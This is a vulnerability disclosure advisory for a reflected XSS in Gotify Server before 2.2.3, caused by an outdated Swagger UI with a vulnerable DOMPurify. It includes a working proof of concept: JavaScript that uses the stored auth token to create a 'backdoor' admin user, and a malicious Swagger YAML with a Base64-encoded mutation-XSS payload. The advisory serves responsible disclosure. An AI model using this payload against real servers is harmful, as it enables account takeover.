# Reflected XSS in Gotify Server via hardcoded import of outdated Swagger UI component

## Advisory Info

- Vendor: [Gotify](https://github.com/gotify)
- Product: [Server](https://github.com/gotify/server)
- Affected Versions: >= 2.0.0 < 2.2.3
- Patched Versions: 2.2.3
- Vendor Advisory: [https://github.com/advisories/GHSA-3244-8mff-w398](https://github.com/advisories/GHSA-3244-8mff-w398)
- Vendor Publication Date: 2023-01-10

## Vulnerability Info

- Class: [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
- CVE: N/A

## Summary

Since [v2.0.0](https://github.com/gotify/server/commit/25576e2ed13020718332c42593fd532994298b5a), Gotify Server includes an instance of the [Swagger UI](https://swagger.io/tools/swagger-ui/) API documentation frontend at the `/docs` [route](https://github.com/gotify/server/blob/v2.2.2/router/router.go#L68).

Until [v2.2.3](https://github.com/gotify/server/pull/541), the Swagger UI version hardcoded in Gotify's `Docs.UI` (v3.20.5) contained a bundled DOMPurify component which was vulnerable to the mutation XSS identified by Michał Bentkowski in 2021 ([CVE-2020-26870](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26870), [GHSA-qrmm-w75w-3wpx](https://github.com/advisories/GHSA-qrmm-w75w-3wpx)).[^1]

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/swagger-ui/3.20.5/swagger-ui-bundle.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/swagger-ui/3.20.5/swagger-ui-standalone-preset.js"></script>
```

Gotify Server versions before 2.2.3 are thus susceptible to reflected XSS attacks when loading external Swagger config files with the `url` query string parameter.

Since Gotify stores the logged-in user's auth token in localStorage and accepts it via the `X-Gotify-Key` header, this reflected XSS can result in the compromise of logged-in administrative users' accounts (and consequently the Gotify server) if they browse to a crafted URL on that server.

## Steps to Reproduce

1. Use the official [Docker Compose file](https://gotify.net/docs/install#docker) or [example config file](https://raw.githubusercontent.com/gotify/server/v2.2.2/config.example.yml) to bring up an instance of Gotify Server (herein `https://gotify`) and log in with the admin credentials defined in the `defaultuser` block.

2. Host the Swagger YAML file included at the end of this section at a location that you control (herein `http://attacker/swagger.yaml`). This file is based on the one provided by Vidoc Security[^2] but minified and including the following JavaScript payload Base64-encoded:

```javascript
fetch(window.location.origin + "/user", {
    "credentials": "omit",
    "headers": {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/json",
        "X-Gotify-Key": localStorage.getItem("gotify-login-key")
    },
    "body": "{\"name\": \"backdoor\", \"pass\": \"GotifyReproDemo\", \"admin\": true }",
    "method": "POST",
    "mode": "cors"
});
```

3. Browse to https://gotify/docs?url=https://attacker/swagger.yaml, then browse to https://gotify/#/users and observe that a new admin user with the name `backdoor` has been added to your Gotify Server instance:

![Gotify Server Web UI showing the 'backdoor' user demonstrating successful reproduction of the issue](images/1.png)

### Swagger YAML file

```yaml
swagger: '2.0'
info:
  title: Proof of Concept
  description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror='eval(atob(`ZmV0Y2god2luZG93LmxvY2F0aW9uLm9yaWdpbiArICIvdXNlciIsIHsKICAgICJjcmVkZW50aWFscyI6ICJvbWl0IiwKICAgICJoZWFkZXJzIjogewogICAgICAgICJBY2NlcHQiOiAiYXBwbGljYXRpb24vanNvbiwgdGV4dC9wbGFpbiwgKi8qIiwKICAgICAgICAiQWNjZXB0LUxhbmd1YWdlIjogImVuLVVTLGVuO3E9MC41IiwKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJYLUdvdGlmeS1LZXkiOiBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiZ290aWZ5LWxvZ2luLWtleSIpCiAgICB9LAogICAgImJvZHkiOiAie1wibmFtZVwiOiBcImJhY2tkb29yXCIsIFwicGFzc1wiOiBcIkdvdGlmeVJlcHJvRGVtb1wiLCBcImFkbWluXCI6IHRydWUgfSIsCiAgICAibWV0aG9kIjogIlBPU1QiLAogICAgIm1vZGUiOiAiY29ycyIKfSk7`))' src=1>"></form>
  version: production
basePath: /poc
```

## Impact

An attacker can execute arbitrary JavaScript in the context of a logged-in user who browses to a crafted URL on their Gotify server and gain administrative access to the Web UI if the server is reachable and the victim was an administrator.

## Timeline

- 2023-01-10: Vulnerability discovery
- 2023-01-10: Advisory sent to vendor
- 2023-01-10: Vendor acknowledgment
- 2023-01-10: Vendor releases fix in v2.2.3 ([PR](https://github.com/gotify/server/pull/541), [release](https://github.com/gotify/server/releases/tag/v2.2.3))
- 2023-01-10: Public disclosure via [GitHub Security Advisory](https://github.com/advisories/GHSA-3244-8mff-w398)

<!-- References -->

[^1]: [Mutation XSS via namespace confusion - DOMPurify < 2.0.17 bypass (Securitum)](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)

[^2]: [Hacking Swagger-UI - from XSS to account takeovers (Vidoc Security)](https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/)
